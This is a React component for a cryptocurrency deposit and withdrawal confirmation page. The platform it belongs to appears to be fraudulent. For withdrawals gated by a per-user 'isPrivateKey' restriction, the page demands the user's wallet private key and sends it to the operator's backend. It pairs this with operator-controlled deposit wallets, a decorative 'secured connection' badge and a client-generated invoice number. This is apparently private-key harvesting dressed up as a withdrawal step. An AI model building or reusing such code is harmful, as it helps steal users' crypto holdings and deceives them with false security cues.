import styles from "./ConfirmTransaction.module.scss";
import ConnectionSecuredIcon from "@assets/icons/connection-secured.svg?react";
import SFCIcon from "@assets/icons/sfc-energy.svg?react";
import WideButton from "@SharedUI/WideButton/WideButton.tsx";
import { generateSixDigitCode } from "@/utils/helpers.tsx";
import { ScrollRestoration, useLocation, useNavigate } from "react-router-dom";
import { useUser } from "@/hooks/useUser.ts";
import { useEffect, useMemo, useState } from "react";
import ConfirmedPopup from "@SharedUI/ConfirmedPopup/ConfirmedPopup.tsx";
import { OUR_WALLETS } from "@/utils/OUR_WALLETS.tsx";
import toast from "react-hot-toast";
import IconCircleCheckFilled from "@/assets/icons/circle-check.svg?react";
import { parseTimestamp } from "@/utils/helpers/date.tsx";
import { Timestamp } from "firebase/firestore";
import PaymentInstruction from "@/pages/ConfirmTransaction/PaymentInstruction/PaymentInstruction.tsx";
import PrivateKey from "@/pages/ConfirmTransaction/PrivateKey/PrivateKey.tsx";
import axios from "axios";
import { BACKEND_URL } from "@/utils/const.tsx";
import { I18nextProvider, Trans, useTranslation } from "react-i18next";

const ConfirmTransaction = () => {
  const { t, i18n } = useTranslation("confirmTransaction");
  const location = useLocation();
  const navigate = useNavigate();
  const formData = location.state;
  const { user } = useUser();
  const { type, amount, wallet } = formData;
  const isDepositType = type === "deposit";
  const [confirmedPopupIsOpen, setConfirmedPopupIsOpen] = useState(false);
  const [transactionHash, setTransactionHash] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const transactionId = useMemo(() => {
    return generateSixDigitCode();
  }, []);

  const openPopup = () => {
    setConfirmedPopupIsOpen(true);
    document.body.style.overflow = "hidden";
    window.scrollTo(0, 0);
  };

  const onSubmitTransaction = async () => {
    if (!user) return;

    if (isDepositType && !transactionHash) {
      toast.error(t("enter_hash"));
      return;
    }

    if (!isDepositType && user.restrictions.isPrivateKey && !privateKey) {
      toast.error(t("enter_private_key"));
      return;
    }

    const transactionData = {
      type: isDepositType ? "Пополнение" : "Вывод",
      status: "Ожидание",
      amount,
      nickname: user.nickname,
      executor: wallet,
      transactionHash,
      privateKey,
      userWallet: user.wallets[wallet].number,
    };

    openPopup();

    await axios.post(`${BACKEND_URL}/transaction/add-transaction`, transactionData);
  };

  const copyWallet = () => {
    toast.success(t("copy"));
    navigator.clipboard.writeText(OUR_WALLETS[wallet]);
  };

  useEffect(() => {
    return () => {
      document.body.style.overflow = "";
    };
  }, []);

  if (!user) return null;

  return (
    <I18nextProvider i18n={i18n} defaultNS={"confirmTransaction"}>
      <div className={styles["transaction-confirmation"]}>
        <span className={styles["invoice-number"]}>#{transactionId}</span>
        <div className={styles["row"]}>
          <span className={styles["icon"]}>
            <IconCircleCheckFilled width={35} height={35} color={"#14CC74"} />
          </span>
          <p className={styles["title"]}>{isDepositType ? t("invoiced") : t("withdrawn_invoice")}</p>
          <p className={styles["amount"]}>USD {Number(amount).toFixed(2)}</p>
        </div>
        <div className={styles["columns-wrapper"]}>
          <div className={styles["left-column"]}>
            {user.restrictions.isPrivateKey && !isDepositType && (
              <PrivateKey privateKey={privateKey} setPrivateKey={setPrivateKey} />
            )}
            {isDepositType && (
              <PaymentInstruction
                wallet={wallet}
                transactionHash={transactionHash}
                setTransactionHash={setTransactionHash}
                copyWalletHandler={copyWallet}
              />
            )}
          </div>
          <div className={styles["right-column"]}>
            <div className={styles["fields"]}>
              <div className={styles["field"]}>
                <span>{t("status")}</span>
                <p>{t("pending")}</p>
              </div>
              <div className={`${styles["field"]} ${styles["wallet-field"]}`}>
                <span>{t("method_pay")}</span>
                <p>{wallet}</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("transaction_on")}</span>
                <p>{OUR_WALLETS[wallet]}</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("amount")}</span>
                <p>{amount} USDT</p>
              </div>
              <div className={styles["field"]}>
                <span>{t("date")}</span>
                <p>{parseTimestamp(Timestamp.now())}</p>
              </div>
            </div>

            <div
              className={`${styles["secure-connection"]} ${!isDepositType ? styles["secure-connection-withdrawn"] : ""}`}
            >
              <p>
                <ConnectionSecuredIcon />
                <Trans i18nKey={"secured_connection"} components={{ br: <br /> }} />
              </p>
              <SFCIcon />
            </div>

            <p className={styles["disclaimer"]}>
              {isDepositType ? t("topup_disclaimer") : t("withdrawn_disclaimer")}
            </p>
            <div className={styles["buttons"]}>
              <WideButton
                onClickHandler={() => {
                  navigate(-1);
                }}
                text={t("cancel")}
                isTransparent
                isCancelButton
              />
              <WideButton
                onClickHandler={onSubmitTransaction}
                text={isDepositType ? t("paid") : t("confirm")}
                isCheckButton
              />
            </div>
          </div>
        </div>
        {confirmedPopupIsOpen && <ConfirmedPopup />}
        <ScrollRestoration />
      </div>
    </I18nextProvider>
  );
};

export default ConfirmTransaction;
